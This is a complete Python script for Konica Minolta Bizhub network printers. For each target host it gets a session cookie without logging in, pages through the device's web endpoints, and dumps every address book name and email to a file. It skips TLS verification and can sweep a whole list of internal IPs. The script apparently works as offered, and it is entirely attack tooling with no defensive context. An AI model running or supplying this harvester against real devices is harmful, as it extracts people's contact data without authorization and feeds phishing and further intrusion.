#!/usr/bin/env python3
import argparse
import requests
import sys
import os
import xml.etree.ElementTree as ET

# Suppress "InsecureRequestWarning" about verify=False
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

CHUNK_SIZE = 50  # Fetch records in increments of 50
MAX_ENTRIES = 2000  # Max limit the device supports

def parse_args():
    parser = argparse.ArgumentParser(description="Fetch full address book from internal network printers (Bizhub).")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--ip", help="Single IP or hostname.")
    group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")
    parser.add_argument("-d", "--debug", action="store_true", help="Print debug info, including response details and cookie info.")
    return parser.parse_args()

def auto_get_cookie(host, debug=False):
    """Attempt to get a cookie, first using HTTPS. If it fails, fall back to HTTP."""
    for protocol in ["https", "http"]:
        url = f"{protocol}://{host}/wcd/index.html"
        session = requests.Session()
        try:
            r = session.get(url, verify=False, timeout=10)
            if debug:
                print(f"[DEBUG] GET {url} -> status {r.status_code}")
                print("[DEBUG] Response headers:\n", r.headers)
                print("[DEBUG] Response body:\n", r.text[:400] + ("..." if len(r.text) > 400 else ""))

            r.raise_for_status()
            if "ID" in session.cookies:
                cookie_value = session.cookies.get_dict().get("ID", "")
                if debug:
                    print(f"[DEBUG] Auto-fetched cookie over {protocol.upper()} for {host}: ID={cookie_value}")
                return session, protocol, cookie_value

        except requests.exceptions.RequestException as e:
            if debug:
                print(f"[DEBUG] Error fetching cookie from {protocol}://{host}: {e}")
            continue  

    print(f"[!] Failed to retrieve an ID cookie over both HTTPS and HTTP for {host}.")
    return None, None, None

def fetch_abbr_chunk(host, protocol, session, cookie_value, debug=False):
    """Fetch the current page of records from /wcd/abbr.xml."""
    url = f"{protocol}://{host}/wcd/abbr.xml"
    headers = {"Cookie": f"ID={cookie_value}"} if cookie_value else {}

    try:
        resp = session.get(url, headers=headers, verify=False, timeout=15)

        if debug:
            print(f"[DEBUG] Response status: {resp.status_code}")
            print(f"[DEBUG] Response body (first 1000 chars):\n{resp.text[:1000]}")

        if resp.status_code == 200:
            return resp.text  
        return None

    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] RequestException fetching XML: {e}")
        return None

def request_next_page(host, protocol, session, cookie_value, start, end, debug=False):
    """Send a POST request to /user.cgi to load the next page of users."""
    url = f"{protocol}://{host}/wcd/user.cgi"
    headers = {"Cookie": f"ID={cookie_value}", "Content-Type": "application/x-www-form-urlencoded"}
    data = f"func=PSL_C_ABR_PAG&H_SRT={start}&H_END={end}&H_AKI=Public&H_FAV=&S_SCON=No&S_ORD=Ascending"

    try:
        resp = session.post(url, headers=headers, data=data, verify=False, timeout=15)

        if debug:
            print(f"[DEBUG] POST {url} -> status {resp.status_code}")
            print(f"[DEBUG] POST response body (first 400 chars):\n{resp.text[:400]}")

        return resp.status_code == 200  
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] RequestException posting to user.cgi: {e}")
        return False

def parse_xml(xml_data, debug=False):
    """Extract Name and Email from the XML response."""
    try:
        root = ET.fromstring(xml_data)
        address_section = root.find(".//Address")
        if address_section is None:
            if debug:
                print("[DEBUG] No <Address> block found.")
            return []

        abbr_list = address_section.find("AbbrList")
        if abbr_list is None:
            if debug:
                print("[DEBUG] No <AbbrList> found inside <Address>.")
            return []

        parsed_data = []
        for abbr in abbr_list.findall("Abbr"):
            name_element = abbr.find("Name")
            name = name_element.text.strip() if name_element is not None else "Unknown"

            send_config = abbr.find("SendConfiguration")
            email = "No Email"
            if send_config is not None:
                address_info = send_config.find("AddressInfo")
                if address_info is not None:
                    email_mode = address_info.find("EmailMode")
                    if email_mode is not None:
                        to_element = email_mode.find("To")
                        email = to_element.text.strip() if to_element is not None else "No Email"

            parsed_data.append((name, email))

            if debug:
                print(f"[DEBUG] Extracted Name: {name}, Email: {email}")

        return parsed_data

    except ET.ParseError as e:
        if debug:
            print(f"[DEBUG] XML parsing error: {e}")
        return []

def fetch_all_abbr(host, protocol, session, cookie_value, debug=False):
    """Fetch the full address book by iterating in increments of CHUNK_SIZE (50)."""
    all_records = []
    for start in range(1, MAX_ENTRIES + 1, CHUNK_SIZE):
        end = start + CHUNK_SIZE - 1

        xml_data = fetch_abbr_chunk(host, protocol, session, cookie_value, debug=debug)
        if not xml_data:
            break  

        parsed_data = parse_xml(xml_data, debug=debug)
        if not parsed_data:
            if debug:
                print(f"[DEBUG] No records found in range {start}-{end}, stopping iteration.")
            break  

        all_records.extend(parsed_data)

        if end >= MAX_ENTRIES:
            break  

        if not request_next_page(host, protocol, session, cookie_value, start+CHUNK_SIZE, end+CHUNK_SIZE, debug=debug):
            if debug:
                print(f"[DEBUG] Failed to request next page for {start+CHUNK_SIZE}-{end+CHUNK_SIZE}.")
            break  

    return all_records

def process_host(host, debug=False):
    """Handles full address book extraction for a single host."""
    session, protocol, cookie_value = auto_get_cookie(host, debug=debug)
    if not session:
        return

    abbr_list = fetch_all_abbr(host, protocol, session, cookie_value, debug=debug)

    if not abbr_list:
        print(f"[!] No address book entries found for {host}.")
        return

    output_file = f"{host}_addrbook.txt"
    with open(output_file, "w", encoding="utf-8") as f:
        for name, email in abbr_list:
            f.write(f"{name},{email}\n")

    print(f"[+] Extracted {len(abbr_list)} records from {host} -> {output_file}")

def main():
    parser = parse_args()
    hosts = [parser.ip] if parser.ip else open(parser.list).read().splitlines()

    for host in hosts:
        host = host.strip()
        if host:
            process_host(host, debug=parser.debug)

if __name__ == "__main__":
    main()
